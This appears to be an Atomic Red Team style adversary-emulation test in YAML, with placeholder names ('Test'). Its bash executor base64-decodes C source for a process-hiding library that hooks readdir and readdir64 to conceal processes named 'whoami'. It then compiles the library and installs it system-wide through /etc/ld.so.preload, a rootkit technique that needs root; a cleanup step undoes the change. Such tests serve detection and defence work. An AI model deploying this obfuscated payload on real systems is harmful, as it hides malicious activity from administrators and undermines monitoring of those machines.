attack_technique: Test
display_name: Test
atomic_tests:
- name: Test
  description: Test
  supported_platforms:
    - linux
    - containers
  input_arguments:
    Temporary Directory:
      description: Name of the temporary directory used for this test
      type: String
      default: test_preload_dir
  executor:
    command: |
      mkdir "/tmp/#{Temporary Directory}"; cd "/tmp/#{Temporary Directory}"
      echo I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxkbGZjbi5oPgojaW5jbHVkZSA8ZGlyZW50Lmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKLyoKICogRXZlcnkgcHJvY2VzcyB3aXRoIHRoaXMgbmFtZSB3aWxsIGJlIGV4Y2x1ZGVkCiAqLwpzdGF0aWMgY29uc3QgY2hhciogcHJvY2Vzc190b19maWx0ZXIgPSAid2hvYW1pIjsKCi8qCiAqIEdldCBhIGRpcmVjdG9yeSBuYW1lIGdpdmVuIGEgRElSKiBoYW5kbGUKICovCnN0YXRpYyBpbnQgZ2V0X2Rpcl9uYW1lKERJUiogZGlycCwgY2hhciogYnVmLCBzaXplX3Qgc2l6ZSkKewogICAgaW50IGZkID0gZGlyZmQoZGlycCk7CiAgICBpZihmZCA9PSAtMSkgewogICAgICAgIHJldHVybiAwOwogICAgfQoKICAgIGNoYXIgdG1wWzY0XTsKICAgIHNucHJpbnRmKHRtcCwgc2l6ZW9mKHRtcCksICIvcHJvYy9zZWxmL2ZkLyVkIiwgZmQpOwogICAgc3NpemVfdCByZXQgPSByZWFkbGluayh0bXAsIGJ1Ziwgc2l6ZSk7CiAgICBpZihyZXQgPT0gLTEpIHsKICAgICAgICByZXR1cm4gMDsKICAgIH0KCiAgICBidWZbcmV0XSA9IDA7CiAgICByZXR1cm4gMTsKfQoKLyoKICogR2V0IGEgcHJvY2VzcyBuYW1lIGdpdmVuIGl0cyBwaWQKICovCnN0YXRpYyBpbnQgZ2V0X3Byb2Nlc3NfbmFtZShjaGFyKiBwaWQsIGNoYXIqIGJ1ZikKewogICAgaWYoc3Ryc3BuKHBpZCwgIjAxMjM0NTY3ODkiKSAhPSBzdHJsZW4ocGlkKSkgewogICAgICAgIHJldHVybiAwOwogICAgfQoKICAgIGNoYXIgdG1wWzI1Nl07CiAgICBzbnByaW50Zih0bXAsIHNpemVvZih0bXApLCAiL3Byb2MvJXMvc3RhdCIsIHBpZCk7CiAKICAgIEZJTEUqIGYgPSBmb3Blbih0bXAsICJyIik7CiAgICBpZihmID09IE5VTEwpIHsKICAgICAgICByZXR1cm4gMDsKICAgIH0KCiAgICBpZihmZ2V0cyh0bXAsIHNpemVvZih0bXApLCBmKSA9PSBOVUxMKSB7CiAgICAgICAgZmNsb3NlKGYpOwogICAgICAgIHJldHVybiAwOwogICAgfQoKICAgIGZjbG9zZShmKTsKCiAgICBpbnQgdW51c2VkOwogICAgc3NjYW5mKHRtcCwgIiVkICglW14pXXMiLCAmdW51c2VkLCBidWYpOwogICAgcmV0dXJuIDE7Cn0KCiNkZWZpbmUgREVDTEFSRV9SRUFERElSKGRpcmVudCwgcmVhZGRpcikgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKc3RhdGljIHN0cnVjdCBkaXJlbnQqICgqb3JpZ2luYWxfIyNyZWFkZGlyKShESVIqKSA9IE5VTEw7ICAgICAgICAgICAgICAgXAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCnN0cnVjdCBkaXJlbnQqIHJlYWRkaXIoRElSICpkaXJwKSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKeyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgaWYob3JpZ2luYWxfIyNyZWFkZGlyID09IE5VTEwpIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgb3JpZ2luYWxfIyNyZWFkZGlyID0gZGxzeW0oUlRMRF9ORVhULCAjcmVhZGRpcik7ICAgICAgICAgICAgICAgXAogICAgICAgIGlmKG9yaWdpbmFsXyMjcmVhZGRpciA9PSBOVUxMKSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgeyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJFcnJvciBpbiBkbHN5bTogJXNcbiIsIGRsZXJyb3IoKSk7ICAgICAgICAgXAogICAgICAgIH0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICB9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgc3RydWN0IGRpcmVudCogZGlyOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgIHdoaWxlKDEpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgeyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgZGlyID0gb3JpZ2luYWxfIyNyZWFkZGlyKGRpcnApOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICBpZihkaXIpIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgICAgICBjaGFyIGRpcl9uYW1lWzI1Nl07ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgICAgIGNoYXIgcHJvY2Vzc19uYW1lWzI1Nl07ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICAgICAgaWYoZ2V0X2Rpcl9uYW1lKGRpcnAsIGRpcl9uYW1lLCBzaXplb2YoZGlyX25hbWUpKSAmJiAgICAgICAgXAogICAgICAgICAgICAgICAgc3RyY21wKGRpcl9uYW1lLCAiL3Byb2MiKSA9PSAwICYmICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgICAgICAgICBnZXRfcHJvY2Vzc19uYW1lKGRpci0+ZF9uYW1lLCBwcm9jZXNzX25hbWUpICYmICAgICAgICAgIFwKICAgICAgICAgICAgICAgIHN0cmNtcChwcm9jZXNzX25hbWUsIHByb2Nlc3NfdG9fZmlsdGVyKSA9PSAwKSB7ICAgICAgICAgXAogICAgICAgICAgICAgICAgY29udGludWU7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICB9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgIGJyZWFrOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICB9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgIHJldHVybiBkaXI7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAp9CgpERUNMQVJFX1JFQURESVIoZGlyZW50NjQsIHJlYWRkaXI2NCk7CkRFQ0xBUkVfUkVBRERJUihkaXJlbnQsIHJlYWRkaXIpOwo= | base64 -d > processhider.c
      gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
      if [ -s /etc/ld.so.preload ]
      then echo `pwd`/libprocesshider.so >> /etc/ld.so.preload
      else echo `pwd`/libprocesshider.so > /etc/ld.so.preload
      fi
      whoami
    cleanup_command: |
      if [[ $(wc -l < /etc/ld.so.preload) -eq 1 ]]
      then rm /etc/ld.so.preload
      else CHANGED_LD=$(head -n -1 /etc/ld.so.preload); echo $CHANGED_LD > /etc/ld.so.preload
      fi
      rm -r "/tmp/#{Temporary Directory}"
    name: bash
    elevation_required: true